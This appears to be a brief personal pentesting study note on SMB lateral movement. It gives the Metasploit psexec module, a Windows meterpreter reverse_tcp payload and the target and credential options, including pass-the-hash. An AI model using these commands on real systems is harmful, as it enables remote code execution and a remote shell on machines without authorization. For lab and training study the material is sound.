
# SMB

Use #metasploit #LLMNR #smb #psexec
![[Pasted image 20240909122044.png]]

```
use exploit/windows/smb/psexec
```

```
set payload windows/x64/meterpreter/reverse_tcp
```
- can use password or a hash
- set rport
- set rhost
- set smbdomain
- set smbuser
- set smbpass 



